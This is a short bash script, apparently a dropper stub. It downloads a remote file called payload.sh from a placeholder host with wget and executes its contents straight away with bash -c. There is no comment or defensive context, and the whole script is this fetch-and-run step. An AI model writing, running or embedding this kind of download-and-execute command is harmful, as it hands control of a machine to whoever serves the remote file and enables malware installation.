#!/bin/bash
PAYLOAD=$(wget -qO- "http://example.com/payload.sh")
bash -c "$PAYLOAD"
